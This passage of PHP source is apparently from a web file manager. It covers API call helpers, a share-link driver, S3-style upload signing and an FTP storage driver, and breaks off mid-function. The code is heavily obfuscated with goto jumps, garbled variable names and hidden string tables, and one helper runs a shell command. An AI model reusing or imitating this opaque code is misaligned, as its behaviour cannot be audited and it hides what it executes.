<?php
 goto DÜÎ§–‰; DÇŠĞ‹‰±Š: function ActionCall($fá©¶ËİŒ) { $D‚ô¾¢æÅÒ = array_slice(func_get_args(), 1); return ActionApply($fá©¶ËİŒ, $D‚ô¾¢æÅÒ); } function ActionCallApi($AñÚ‰¶Íµâ, $aÛŒÎ—ÒŸò = '') { goto AÑÏ¦¨…‰ì; a‘ŒÇ©†Å: $D‡ª´©„Î× = json_decode($bÕ”ß¢ÌÁå, !0); $fÓæâÍÅ„æ = is_array($D‡ª´©„Î×) ? $D‡ª´©„Î× : array($dá’ï ¤×¡[33] => null, $dá’ï ¤×¡[34] => $bÕ”ß¢ÌÁå); if (!$D‡ª´©„Î×) { echo $bÕ”ß¢ÌÁå; } goto fÀ„Çì¼ŒÙ; AÑÏ¦¨…‰ì: $dá’ï ¤×¡ =& $_SERVER[‚¬û]; $aƒ‡êÔï…ò = $aÛŒÎ—ÒŸò; if (is_array($aÛŒÎ—ÒŸò)) { $aƒ‡êÔï…ò = $dá’ï ¤×¡[20]; foreach ($aÛŒÎ—ÒŸò as $eàÃ¯×íê => $AŞŒĞŞ‘†) { $AŞŒĞŞ‘† = is_array($AŞŒĞŞ‘†) ? json_encode($AŞŒĞŞ‘†) : $AŞŒĞŞ‘†; $AŞŒĞŞ‘† = is_bool($AŞŒĞŞ‘†) ? intval($AŞŒĞŞ‘†) : $AŞŒĞŞ‘†; $aƒ‡êÔï…ò .= $dá’ï ¤×¡[21] . $eàÃ¯×íê . $dá’ï ¤×¡[22] . rawurlencode($AŞŒĞŞ‘†); } } goto F‹» ²ùÇÃ; F‹» ²ùÇÃ: $Døğ­ºÎ¹Ò = Action($dá’ï ¤×¡[23])->accessToken(); $AñÚ‰¶Íµâ = str_replace($dá’ï ¤×¡[5], $dá’ï ¤×¡[4], $AñÚ‰¶Íµâ) . $dá’ï ¤×¡[24] . $Døğ­ºÎ¹Ò . $aƒ‡êÔï…ò; $bÕ”ß¢ÌÁå = $dá’ï ¤×¡[20]; goto f‚²ğí‡·ì; fÀ„Çì¼ŒÙ: return $fÓæâÍÅ„æ; goto c©ƒÖÆÔñ; f‚²ğí‡·ì: $AÍâáã”‹ = phpBinCommand(); if ($AÍâáã”‹ && function_exists($dá’ï ¤×¡[25])) { $B“÷„Ç°‡ˆ = $AÍâáã”‹ . $dá’ï ¤×¡[26] . BASIC_PATH . $dá’ï ¤×¡[27] . escapeshellarg($AñÚ‰¶Íµâ); $bÕ”ß¢ÌÁå = shell_exec($B“÷„Ç°‡ˆ); } if (!$bÕ”ß¢ÌÁå) { $CõÑ‡“­‘Ë = stream_context_create(array($dá’ï ¤×¡[28] => array($dá’ï ¤×¡[29] => 20, $dá’ï ¤×¡[30] => $dá’ï ¤×¡[31]))); $bÕ”ß¢ÌÁå = file_get_contents(APP_HOST . $dá’ï ¤×¡[32] . $AñÚ‰¶Íµâ, !1, $CõÑ‡“­‘Ë); } goto a‘ŒÇ©†Å; c©ƒÖÆÔñ: } function ActionCallHook($aÌŒ¾ë¬Ú) { goto Dˆ«‰‚È; a“ÑïØŒÈƒ: $D´¯ä¥•®ñ = $aœ¿«¡ƒôô ? json_decode($aœ¿«¡ƒôô, !0) : $D´¯ä¥•®ñ; $GLOBALS[$Bõ¿¯Ó›¾Ï[35]] = 0; return $D´¯ä¥•®ñ; goto c‰“Ù˜½³ƒ; Dˆ«‰‚È: $Bõ¿¯Ó›¾Ï =& $_SERVER[‚¬û]; ob_start(); $Cˆ†öèâ“á = array_slice(func_get_args(), 1); goto c©¢ Ïˆ; c©¢ Ïˆ: $GLOBALS[$Bõ¿¯Ó›¾Ï[35]] = 1; $D´¯ä¥•®ñ = ActionApply($aÌŒ¾ë¬Ú, $Cˆ†öèâ“á); $aœ¿«¡ƒôô = ob_get_clean(); goto a“ÑïØŒÈƒ; c‰“Ù˜½³ƒ: } goto d¨‹ë—Œ; eÜŸ±ß™§Î: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($F¤˜Ğ”åÍá) { $this->pathParse = $F¤˜Ğ”åÍá; } protected function infoParse($b¼ƒñŸÑ¹Š) { $e™ê·ƒ¹”Ç =& $_SERVER[¢à]; return Action($e™ê·ƒ¹”Ç[1013])->sharePathInfo($this->pathParse[$e™ê·ƒ¹”Ç[75]], !0); } public function listPath($D…µ”¬¤±, $EÆ³ÑôÆß = false) { $cä¼äÅé¸÷ =& $_SERVER[¢à]; $Dˆ¼Ùñ©¶ = IO::listPath($D…µ”¬¤±, $EÆ³ÑôÆß); foreach ($Dˆ¼Ùñ©¶ as $F³¯ÉãÒ«† => $Fµ†¶óÇğ˜) { if (!in_array($F³¯ÉãÒ«†, array($cä¼äÅé¸÷[73], $cä¼äÅé¸÷[74]))) { continue; } foreach ($Fµ†¶óÇğ˜ as $fèŠ ›ö  => $añÖ•Ş‘œæ) { $añÖ•Ş‘œæ = Action($cä¼äÅé¸÷[1122])->parsePathChildren($añÖ•Ş‘œæ, array($cä¼äÅé¸÷[384] => $D…µ”¬¤±)); $Dˆ¼Ùñ©¶[$F³¯ÉãÒ«†][$fèŠ ›ö ] = Action($cä¼äÅé¸÷[1013])->shareItemInfo($añÖ•Ş‘œæ); } } return $Dˆ¼Ùñ©¶; } public function listAll($C¢‡¬âÀ¼”) { $EØ°â˜™˜– =& $_SERVER[¢à]; $cÙ–…‹ğ = IO::listAll($C¢‡¬âÀ¼”); foreach ($cÙ–…‹ğ as &$a³¸á‹µµ©) { $a³¸á‹µµ© = array_merge(IO::info($a³¸á‹µµ©[$EØ°â˜™˜–[75]]), $a³¸á‹µµ©); $a³¸á‹µµ©[$EØ°â˜™˜–[388]] = Action($EØ°â˜™˜–[1013])->shareItemInfo($a³¸á‹µµ©); } return $cÙ–…‹ğ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($AæÊÎ¨äÄË) { parent::__construct($AæÊÎ¨äÄË); $this->signatureVersion($_SERVER[¢à][197]); } public function uploadFormData($Fé×ó ¥¾¨, $Eãœâ‰¢ÍÒ = 3600) { goto cù¢±°Ãš‰; A‚‘ª¶š–Ê: $aÀƒæÛ…‡ = $d›ŸöË¹ [59]; $f½Ê±İßõŠ = gmdate($d›ŸöË¹ [1124]); $DÓïŞ°÷ = gmdate($d›ŸöË¹ [690]); goto bÃ¦°ºïİ; f„Š¹¹¤”Ì: $e†¼Á‚À– = hash_hmac($d›ŸöË¹ [1133], $aÀƒæÛ…‡, $bÅ•¯®Î‚Ê, !0); $Eå²à»ÃòÔ = hash_hmac($d›ŸöË¹ [1133], $eöè‚¾ Ã», $e†¼Á‚À–, !0); $Dè˜áİ¬ò = hash_hmac($d›ŸöË¹ [1133], $D™ãÜáè‹•, $Eå²à»ÃòÔ); goto aÃ°ÍÉ†í‡; Eé“ó¦‘®Ê: $D™ãÜáè‹• = base64_encode(json_encode($D›¬ğ’›íö)); $eñë½“É = hash_hmac($d›ŸöË¹ [1133], $DÓïŞ°÷, $d›ŸöË¹ [1134] . $this->secret, !0); $bÅ•¯®Î‚Ê = hash_hmac($d›ŸöË¹ [1133], $this->region, $eñë½“É, !0); goto f„Š¹¹¤”Ì; aÃ°ÍÉ†í‡: $CæƒËÕ—…¶ = array($d›ŸöË¹ [196] => $d›ŸöË¹ [33], $d›ŸöË¹ [1135] => $d›ŸöË¹ [33], $d›ŸöË¹ [1093] => $fœ… –êƒë, $d›ŸöË¹ [1097] => $f½ö´ØãÏ, $d›ŸöË¹ [1101] => $D™ãÜáè‹•, $d›ŸöË¹ [1136] => $E‚®§ø°, $d›ŸöË¹ [1137] => $FëÈ©íâ¥, $d›ŸöË¹ [1138] => $f½Ê±İßõŠ, $d›ŸöË¹ [1139] => $FÈğ‡Ûà, $d›ŸöË¹ [1140] => $Dè˜áİ¬ò, $d›ŸöË¹ [166] => $this->getHost()); return $CæƒËÕ—…¶; goto dÀÓ¼‡²¨Ç; eË“·¸Ç²: $Dİèôİõ† = array($this->accessKey, $DÓïŞ°÷, $this->region, $aÀƒæÛ…‡, $eöè‚¾ Ã»); $E‚®§ø° = implode($d›ŸöË¹ [8], $Dİèôİõ†); $D›¬ğ’›íö = array($d›ŸöË¹ [1091] => gmdate($d›ŸöË¹ [1090], strtotime($d›ŸöË¹ [1126])), $d›ŸöË¹ [1092] => array(array($d›ŸöË¹ [1094] => $this->bucket), array($d›ŸöË¹ [1093] => $fœ… –êƒë), array($d›ŸöË¹ [1095], $d›ŸöË¹ [1096], $d›ŸöË¹ [33]), array($d›ŸöË¹ [1095], $d›ŸöË¹ [1127], $d›ŸöË¹ [33]), array($d›ŸöË¹ [1095], $d›ŸöË¹ [1128], $d›ŸöË¹ [33]), array($d›ŸöË¹ [1097] => $f½ö´ØãÏ), array($d›ŸöË¹ [1129] => $E‚®§ø°), array($d›ŸöË¹ [1130] => $FëÈ©íâ¥), array($d›ŸöË¹ [1131] => $f½Ê±İßõŠ), array($d›ŸöË¹ [1132] => $FÈğ‡Ûà))); goto Eé“ó¦‘®Ê; bÃ¦°ºïİ: $eöè‚¾ Ã» = $d›ŸöË¹ [1125]; $FÈğ‡Ûà = $Eãœâ‰¢ÍÒ . $d›ŸöË¹ [33]; $f½ö´ØãÏ = $d›ŸöË¹ [1089]; goto eË“·¸Ç²; cù¢±°Ãš‰: $d›ŸöË¹  =& $_SERVER[¢à]; $fœ… –êƒë = $d›ŸöË¹ [182]; $FëÈ©íâ¥ = $d›ŸöË¹ [1123]; goto A‚‘ª¶š–Ê; dÀÓ¼‡²¨Ç: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($Eåù§é“î) { parent::__construct(); if (count($Eåù§é“î) > 0) { $this->_init($Eåù§é“î); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($B¾¶ğ§õó„) { $fÈ’œßĞµ =& $_SERVER[¢à]; global $config; $this->appCharset = $config[$fÈ’œßĞµ[1141]]; $this->systemCharset = $config[$fÈ’œßĞµ[1142]]; if (isset($B¾¶ğ§õó„[$fÈ’œßĞµ[1143]]) && $B¾¶ğ§õó„[$fÈ’œßĞµ[1143]]) { $this->systemCharset = $B¾¶ğ§õó„[$fÈ’œßĞµ[1143]]; } } public function iconvApp($FŸ÷¹‚¢¦) { return $this->iconvTo($FŸ÷¹‚¢¦, $this->systemCharset, $this->appCharset); } public function iconvSystem($B˜„Â¥‡ã) { return $this->iconvTo($B˜„Â¥‡ã, $this->appCharset, $this->systemCharset); } public function getPathOuter($fìº»‚’”Ÿ) { goto CÚ·à‡ğ˜ª; CÚ·à‡ğ˜ª: $E‚—°¢Ïí =& $_SERVER[¢à]; $cÇÈî•‚ï° = $this->iconvApp($this->pathBase); $fìº»‚’”Ÿ = $this->iconvApp($fìº»‚’”Ÿ); goto FªÌª˜àÕŸ; FªÌª˜àÕŸ: if (substr($cÇÈî•‚ï°, 0, 2) == $E‚—°¢Ïí[1144]) { $cÇÈî•‚ï° = BASIC_PATH . substr($cÇÈî•‚ï°, 2); } if (substr($fìº»‚’”Ÿ, 0, 2) == $E‚—°¢Ïí[1144]) { $fìº»‚’”Ÿ = BASIC_PATH . substr($fìº»‚’”Ÿ, 2); } $cÇÈî•‚ï° = KodIO::clear($cÇÈî•‚ï°); goto d«èœ­ÍÙ; a•ÌîËÒÚ¡: return $this->pathDriver . $E‚—°¢Ïí[8] . ltrim($fìº»‚’”Ÿ, $E‚—°¢Ïí[8]); goto D—¥”ÃÏÍÂ; d«èœ­ÍÙ: $fìº»‚’”Ÿ = KodIO::clear($fìº»‚’”Ÿ); $fìº»‚’”Ÿ = substr($fìº»‚’”Ÿ, strlen($cÇÈî•‚ï°)); if (empty($this->pathDriver)) { return $fìº»‚’”Ÿ; } goto a•ÌîËÒÚ¡; D—¥”ÃÏÍÂ: } private function _init($Bº‘–ƒ±œ· = array()) { goto fŠôÁªç‹›; Fù˜©ëœùÀ: foreach ($Bº‘–ƒ±œ· as $EĞ®¸³¨ß => $bö¢ƒ‰¥  ) { if (isset($this->{$EĞ®¸³¨ß})) { $this->{$EĞ®¸³¨ß} = $bö¢ƒ‰¥  ; } } static $FõîïÎÄÇ = array(); $FÃô ›Šƒ = md5(json_encode($Bº‘–ƒ±œ·)); goto d—º¹É««Ÿ; aÜÃ––‚œŠ: $bÆÔÎ²ã·¹ = isset($FŠÆÎË±[$fƒ—ŒÔĞ…[165]]) && $FŠÆÎË±[$fƒ—ŒÔĞ…[165]] == $fƒ—ŒÔĞ…[1147] ? !0 : !1; $this->scheme = $bÆÔÎ²ã·¹ ? $fƒ—ŒÔĞ…[1148] : $fƒ—ŒÔĞ…[1149]; $this->port = isset($FŠÆÎË±[$fƒ—ŒÔĞ…[167]]) ? $FŠÆÎË±[$fƒ—ŒÔĞ…[167]] : 21; goto e—ºÒ„•ùˆ; e—ºÒ„•ùˆ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $f–¹‘ÍÓì = @ftp_login($this->connect, $this->username, $this->userpass); goto D™Š´Ó¤Çª; fŠôÁªç‹›: $fƒ—ŒÔĞ… =& $_SERVER[¢à]; if (!function_exists($fƒ—ŒÔĞ…[1145])) { show_json(LNG($fƒ—ŒÔĞ…[1146]), !1); } $this->charsetReset($Bº‘–ƒ±œ·); goto Fù˜©ëœùÀ; d—º¹É««Ÿ: if (isset($FõîïÎÄÇ[$FÃô ›Šƒ])) { foreach ($FõîïÎÄÇ[$FÃô ›Šƒ] as $EĞ®¸³¨ß => $bö¢ƒ‰¥  ) { $this->{$EĞ®¸³¨ß} = $bö¢ƒ‰¥  ; } return !0; } $FŠÆÎË± = parse_url(trim($this->server, $fƒ—ŒÔĞ…[8])); $this->host = $FŠÆÎË±[$fƒ—ŒÔĞ…[166]]; goto aÜÃ––‚œŠ; D™Š´Ó¤Çª: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $FõîïÎÄÇ[$FÃô ›Šƒ] = array($fƒ—ŒÔĞ…[1150] => $this->connect, $fƒ—ŒÔĞ…[166] => $this->host, $fƒ—ŒÔĞ…[165] => $this->scheme, $fƒ—ŒÔĞ…[167] => $this->port); goto a£ê‹Ôã¡; a£ê‹Ôã¡: return $f–¹‘ÍÓì; goto E´õªˆº; E´õªˆº: } private function _isconn() { return is_resource($this->connect); } public function mkfile($Eæ‚Š‡ãÒ‹, $CºöæÖãšƒ = '', $dÊĞ¡ã½Ş = REPEAT_RENAME) { if ($this->setContent($Eæ‚Š‡ãÒ‹, $CºöæÖãšƒ)) { return $this->getPathOuter($Eæ‚Š‡ãÒ‹); } return !1; } public function mkdir($b£îƒ¤¸Â, $aªšŒò¾¾½ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $b£îƒ¤¸Â = $this->iconvSystem($b£îƒ¤¸Â); if ($this->isFolder($b£îƒ¤¸Â) || @ftp_mkdir($this->connect, $b£îƒ¤¸Â)) { return $this->getPathOuter($b£îƒ¤¸Â); } if (!$this->mkdir($this->pathFather($b£îƒ¤¸Â))) { return !1; } if ($b£îƒ¤¸Â = @ftp_mkdir($this->connect, $b£îƒ¤¸Â)) { return $this->getPathOuter($b£îƒ¤¸Â); } return !1; } public function copyFile($E‰Ø¹÷Ö½ù, $dº¡µİ—ğ) { goto cìÄ‰À®…ö; B¬èÂ”Ü…À: $aÉ»“ĞÃœ© = $this->iconvApp($BÊ¿Ø¦Ë´); $this->download($E‰Ø¹÷Ö½ù, $aÉ»“ĞÃœ©); $bÄãß‰—º = $this->upload($dº¡µİ—ğ, $aÉ»“ĞÃœ©); goto DÇÊ£Şà; cìÄ‰À®…ö: if (!$this->_isconn()) { return !1; } $B‡¦‹İÂ·Ğ = $this->pathThis($this->iconvSystem($E‰Ø¹÷Ö½ù)); $BÊ¿Ø¦Ë´ = $this->tempFile($B‡¦‹İÂ·Ğ); goto B¬èÂ”Ü…À; DÇÊ£Şà: $this->tempFileRemve($BÊ¿Ø¦Ë´); return $bÄãß‰—º; goto Aá·¥Ñšö; Aá·¥Ñšö: } public function moveFile($A¯ÊŒ©œÚº, $A·´Âºï†‡) { if (!$this->_isconn()) { return !1; } $A¯ÊŒ©œÚº = $this->iconvSystem($A¯ÊŒ©œÚº); $A·´Âºï†‡ = $this->iconvSystem($A·´Âºï†‡); $CÄœİ¶»¸Â = @ftp_rename($this->connect, $A¯ÊŒ©œÚº, $A·´Âºï†‡); return $CÄœİ¶»¸Â ? $this->getPathOuter($A·´Âºï†‡) : !1; } public function delFile($Dñ–Í­Âƒ) { if (!$this->_isconn()) { return !1; } $Dñ–Í­Âƒ = $this->iconvSystem($Dñ–Í­Âƒ); return @ftp_delete($this->connect, $Dñ–Í­Âƒ); } public function delFolder($aŒ·Ç—êà¢) { if (!$this->_isconn()) { return !1; } $aŒ·Ç—êà¢ = $this->iconvSystem($aŒ·Ç—êà¢); $B•ª¡ÇÕ…· = $this->ftpList($aŒ·Ç—êà¢); if (!$B•ª¡ÇÕ…·) { return @ftp_rmdir($this->connect, $aŒ·Ç—êà¢); } foreach ($B•ª¡ÇÕ…· as $aÃµ™‘äøâ) { if ($this->isFolder($aÃµ™‘äøâ)) { $aÃµ™‘äøâ = $this->iconvApp($aÃµ™‘äøâ); $this->delFolder($aÃµ™‘äøâ); } else { @ftp_delete($this->connect, $aÃµ™‘äøâ); } } return @ftp_rmdir($this->connect, $aŒ·Ç—êà¢); } public function rename($cÇ¦ê‘ÙôÑ, $d‰Àœ¾¢Š) { goto dÂÌ—ŠÑ¡ö; Eê°Ú“”ø: $d±ÒÄÈˆ•Û = $this->iconvSystem($d±ÒÄÈˆ•Û); $cÇ¦ê‘ÙôÑ = $this->iconvSystem($cÇ¦ê‘ÙôÑ); $aÕ“«³¥š = $this->pathFather($cÇ¦ê‘ÙôÑ); goto aè½ê‰ØÆù; dÂÌ—ŠÑ¡ö: $FÀÚ‹ß•Ú´ =& $_SERVER[¢à]; if (!$this->_isconn()) { return !1; } $d±ÒÄÈˆ•Û = $this->fileNameAuto($this->pathFather($cÇ¦ê‘ÙôÑ), $d‰Àœ¾¢Š); goto Eê°Ú“”ø; cÑù»‘µ²¥: return $Eò¸¦Ë—Ô ? $this->getPathOuter($F²„ïÂˆ‘) : !1; goto A£Æä‹Œø; aè½ê‰ØÆù: $F²„ïÂˆ‘ = rtrim($aÕ“«³¥š, $FÀÚ‹ß•Ú´[8]) . $FÀÚ‹ß•Ú´[8] . $d±ÒÄÈˆ•Û; $Eò¸¦Ë—Ô = @ftp_rename($this->connect, $cÇ¦ê‘ÙôÑ, $F²„ïÂˆ‘); $F²„ïÂˆ‘ = $this->iconvApp($F²„ïÂˆ‘); goto cÑù»‘µ²¥; A£Æä‹Œø: } private function folderInfo($BÃéÖíÚ‡, $cº†ëŠÖ§Ÿ = false) { goto cø‰í÷®‚‡; b•ºŒÁšÏñ: $fç»õÛ‘º¹ = $this->iconvSystem($BÃéÖíÚ‡); if ($cº†ëŠÖ§Ÿ) { return array($FŞÏ·‹ƒ«Ÿ[28] => $dƒ ®è¶ô, $FŞÏ·‹ƒ«Ÿ[75] => $E‚ºˆéº¯…, $FŞÏ·‹ƒ«Ÿ[29] => $FŞÏ·‹ƒ«Ÿ[76]); } $C¥ëÄØ‹¨Ú = array($FŞÏ·‹ƒ«Ÿ[28] => $dƒ ®è¶ô, $FŞÏ·‹ƒ«Ÿ[75] => $E‚ºˆéº¯…, $FŞÏ·‹ƒ«Ÿ[29] => $FŞÏ·‹ƒ«Ÿ[76], $FŞÏ·‹ƒ«Ÿ[184] => 0, $FŞÏ·‹ƒ«Ÿ[107] => 0, $FŞÏ·‹ƒ«Ÿ[1151] => !0, $FŞÏ·‹ƒ«Ÿ[1152] => !0); goto a¨¥ğŸÃâ±; cø‰í÷®‚‡: $FŞÏ·‹ƒ«Ÿ =& $_SERVER[¢à]; $E‚ºˆéº¯… = $this->getPathOuter(rtrim($BÃéÖíÚ‡, $FŞÏ·‹ƒ«Ÿ[8])); $dƒ ®è¶ô = $this->pathThis($E‚ºˆéº¯…); goto b•ºŒÁšÏñ; a¨¥ğŸÃâ±: return $C¥ëÄØ‹¨Ú; goto b÷£¨ÎÒ‘; b÷£¨ÎÒ‘: } private function fileInfo($DÌ¹İ˜¤¥º, $C¸ƒ¦ï¬µ™ = false) { goto D’”µŸ‡®Ö; dÉØÀ½¶¨Ÿ: $fí¢ˆ½¤É¼ = $this->iconvSystem($DÌ¹İ˜¤¥º); if ($C¸ƒ¦ï¬µ™) { return array($a‰Ä©í…®‰[28] => $b Ô¯¨”ÒÅ, $a‰Ä©í…®‰[75] => $cÂ÷Ûï‰›¨, $a‰Ä©í…®‰[29] => $a‰Ä©í…®‰[164], $a‰Ä©í…®‰[157] => $this->ext($DÌ¹İ˜¤¥º), $a‰Ä©í…®‰[77] => $this->size($DÌ¹İ˜¤¥º)); } $B„¯×¶‘„´ = array($a‰Ä©í…®‰[28] => $b Ô¯¨”ÒÅ, $a‰Ä©í…®‰[75] => $cÂ÷Ûï‰›¨, $a‰Ä©í…®‰[29] => $a‰Ä©í…®‰[164], $a‰Ä©í…®‰[184] => 0, $a‰Ä©í…®‰[107] => @ftp_mdtm($this->connect, $fí¢ˆ½¤É¼), $a‰Ä©í…®‰[157] => $this->ext($DÌ¹İ˜¤¥º), $a‰Ä©í…®‰[77] => $this->size($DÌ¹İ˜¤¥º), $a‰Ä©í…®‰[1151] => !0, $a‰Ä©í…®‰[1152] => !0); goto Eğë…²‡»à; Eğë…²‡»à: $B„¯×¶‘„´[$a‰Ä©í…®‰[107]] = $B„¯×¶‘„´[$a‰Ä©í…®‰[107]] > 0 ? $B„¯×¶‘„´[$a‰Ä©í…®‰[107]] : 0; return $B„¯×¶‘„´; goto F¹™ƒĞæ¿…; D’”µŸ‡®Ö: $a‰Ä©í…®‰ =& $_SERVER[¢à]; $cÂ÷Ûï‰›¨ = $this->getPathOuter(rtrim($DÌ¹İ˜¤¥º, $a‰Ä©í…®‰[8])); $b Ô¯¨”ÒÅ = $this->pathThis($cÂ÷Ûï‰›¨); goto dÉØÀ½¶¨Ÿ; F¹™ƒĞæ¿…: } public function size($A–îÅÓ‚Ä) { $fò¼Şöè„İ = $this->objectMeta($A–îÅÓ‚Ä); return $fò¼Şöè„İ ? $fò¼Şöè„İ[$_SERVER[¢à][77]] : 0; } public function info($B¸Ö¨ÉÎóŠ) { if ($this->isFile($B¸Ö¨ÉÎóŠ)) { return $this->fileInfo($B¸Ö¨ÉÎóŠ, 0); } else { if ($this->isFolder($B¸Ö¨ÉÎóŠ)) { return $this->folderInfo($B¸Ö¨ÉÎóŠ); } } return !1; } public function exist($cà½ô¢µØ¬) { return $this->objectMeta($cà½ô¢µØ¬) ? !0 : !1; } public function isFile($CÇ¡Çœğ®õ) { $dŞ¤§äë®Ó =& $_SERVER[¢à]; $C²½·¨ÚÁÄ = $this->objectMeta($CÇ¡Çœğ®õ); return $C²½·¨ÚÁÄ ? $C²½·¨ÚÁÄ[$dŞ¤§äë®Ó[29]] == $dŞ¤§äë®Ó[164] : !1; } public function isFolder($dÅ×àÄäªÜ) { $eĞ´²¬Ï•¿ =& $_SERVER[¢à]; $Få“äˆÍ = $this->objectMeta($dÅ×àÄäªÜ); return $Få“äˆÍ ? $Få“äˆÍ[$eĞ´²¬Ï•¿[29]] == $eĞ´²¬Ï•¿[76] : !1; } public function listPath($DÓ†Ú˜ë˜Š, $aá­Èë¦ß = false) { goto D­ªÁù£—Ì; BÍ°’İÏ…¢: $DÆßàò‰“¾ = $this->ftpList($DÓ†Ú˜ë˜Š); $bŞ™ÃÓËÚÈ = array($Aä¤êŒ‘×Ö[74] => array(), $Aä¤êŒ‘×Ö[73] => array()); if (!$DÆßàò‰“¾) { return $bŞ™ÃÓËÚÈ; } goto bÊÌ®‰Àº–; bÊÌ®‰Àº–: foreach ($DÆßàò‰“¾ as $DÓ†Ú˜ë˜Š) { if ($this->isFolder($DÓ†Ú˜ë˜Š)) { $bŞ™ÃÓËÚÈ[$Aä¤êŒ‘×Ö[74]][] = $this->folderInfo($DÓ†Ú˜ë˜Š, $aá­Èë¦ß); } else { $bŞ™ÃÓËÚÈ[$Aä¤êŒ‘×Ö[73]][] = $this->fileInfo($DÓ†Ú˜ë˜Š, $aá­Èë¦ß); } } return $bŞ™ÃÓËÚÈ; goto e×½ÓŸŠ‰‘; D­ªÁù£—Ì: $Aä¤êŒ‘×Ö =& $_SERVER[¢à]; if (!$this->_isconn()) { return !1; } $DÓ†Ú˜ë˜Š = $this->iconvSystem($DÓ†Ú˜ë˜Š); goto BÍ°’İÏ…¢; e×½ÓŸŠ‰‘: } public function has($D°¶·Œ²ÒË, $aèŠ¾ïŠ‹ƒ = false, $cÛŠ¼š»è = true) { goto bÖçŠç¼ê; a±Â›ÎÎ‘Ö: $DŒŒ˜ìÕâê = $this->ftpList($D°¶·Œ²ÒË); if (!$DŒŒ˜ìÕâê) { return !1; } if ($aèŠ¾ïŠ‹ƒ) { return array($E¡à‡˜Â±[188] => 0, $E¡à‡˜Â±[189] => count($DŒŒ˜ìÕâê)); } goto eßÃ£¬¡‘; eßÃ£¬¡‘: foreach ($DŒŒ˜ìÕâê as $D°¶·Œ²ÒË) { if ($cÛŠ¼š»è) { if (!$this->isFolder($D°¶·Œ²ÒË)) { return !0; } } else { if ($this->isFolder($D°¶·Œ²ÒË)) { return !0; } } } return !1; goto Cñ¨†ß‹ñ…; bÖçŠç¼ê: $E¡à‡˜Â± =& $_SERVER[¢à]; if (!$this->_isconn()) { return !1; } $D°¶·Œ²ÒË = $this->iconvSystem($D°¶·Œ²ÒË); goto a±Â›ÎÎ‘Ö; Cñ¨†ß‹ñ…: } public function listAll($F„ÓçÓä¦ˆ) { goto D™ããì¦¾²; b®ß ñÉ˜ë: $c÷Û¶Í†©† = array($cŠ“œéİ°[73] => array(), $cŠ“œéİ°[74] => array()); $this->recursionFtpFiles($F„ÓçÓä¦ˆ, $c÷Û¶Í†©†); $d¬¿˜§ç± = array(); goto CŸÁ›¿¦í; D™ããì¦¾²: $cŠ“œéİ° =& $_SERVER[¢à]; if (!$this->_isconn()) { return !1; } $F„ÓçÓä¦ˆ = $this->iconvSystem($F„ÓçÓä¦ˆ); goto b®ß ñÉ˜ë; CŸÁ›¿¦í: foreach ($c÷Û¶Í†©†[$cŠ“œéİ°[74]] as $eŞƒƒ¼Şôï) { $d¬¿˜§ç±[] = array($cŠ“œéİ°[75] => $cŠ“œéİ°[8] . trim(str_replace($F„ÓçÓä¦ˆ, $cŠ“œéİ°[33], $eŞƒƒ¼Şôï), $cŠ“œéİ°[8]) . $cŠ“œéİ°[8], $cŠ“œéİ°[76] => 1, $cŠ“œéİ°[77] => 0); } foreach ($c÷Û¶Í†©†[$cŠ“œéİ°[73]] as $d·ì¨†î) { $d¬¿˜§ç±[] = array($cŠ“œéİ°[75] => $cŠ“œéİ°[8] . trim(str_replace($F„ÓçÓä¦ˆ, $cŠ“œéİ°[33], $d·ì¨†î), $cŠ“œéİ°[8]), $cŠ“œéİ°[76] => 0, $cŠ“œéİ°[77] => $this->size($d·ì¨†î)); } return $d¬¿˜§ç±; goto E™°ÙÀø³; E™°ÙÀø³: } public function getContent($dÖÄ˜†°‡‹) { if (!$this->_isconn()) { return !1; } $dÖÄ˜†°‡‹ = $this->iconvSystem($dÖÄ˜†°‡‹); return $this->fileSubstr($dÖÄ˜†°‡‹); } public function setContent($eåˆ¯„àÆº, $a‹øƒÂŞ‹ = '') { goto d½˜ÕéË; BÛ®¹‹Æ‡¿: file_put_contents($Fùô¥¬ÔÔÚ, $a‹øƒÂŞ‹); $Aé‘“İŸ§ = $this->upload($eåˆ¯„àÆº, $this->iconvApp($Fùô¥¬ÔÔÚ)); $this->tempFileRemve($Fùô¥¬ÔÔÚ); goto fÒÌ‘¢»†; d½˜ÕéË: if (!$this->_isconn()) { return !1; } $BöóÓÔÚ–¨ = $this->pathThis($this->iconvSystem($eåˆ¯„àÆº)); $Fùô¥¬ÔÔÚ = $this->tempFile($BöóÓÔÚ–¨); goto BÛ®¹‹Æ‡¿; fÒÌ‘¢»†: return $Aé‘“İŸ§; goto B”´§˜ªæï; B”´§˜ªæï: } public function fileSubstr($D¢ÙìõŠÜ¢, $FØƒ‘äÂÅ = 0, $B¯á’ñ¨ğ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($D¢ÙìõŠÜ¢, $FØƒ‘äÂÅ, $B¯á’ñ¨ğ); } private function ftpRequest($a‚´ŒóíÍ, $f‡‡ÚŸ±÷‚ = 0, $E»õ­·Ó”Ì = false) { goto d…î™Ù©íÖ; d…î™Ù©íÖ: $a‚´ŒóíÍ = $this->iconvSystem($a‚´ŒóíÍ); $e¸ö‡ĞÉÚš = $this->scheme . $this->host . $_SERVER[¢à][4] . $this->port; $f­‹™óàæ = curl_init(); goto fÖó³Ï‚‚ƒ; C øĞÌ„Áì: return $bÔŒËË¦†¤; goto c¸´åÌ¯õ; cÒ¡œÕÚ¸®: curl_setopt($f­‹™óàæ, CURLOPT_RETURNTRANSFER, 1); $bÔŒËË¦†¤ = curl_exec($f­‹™óàæ); curl_close($f­‹™óàæ); goto C øĞÌ„Áì; fÖó³Ï‚‚ƒ: curl_setopt($f­‹™óàæ, CURLOPT_URL, $e¸ö‡ĞÉÚš . $this->pathEncode($a‚´ŒóíÍ)); curl_setopt($f­‹™óàæ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($E»õ­·Ó”Ì) { $E—„ ê£ô = $f‡‡ÚŸ±÷‚ + $E»õ­·Ó”Ì - 1; curl_setopt($f­‹™óàæ, CURLOPT_RANGE, 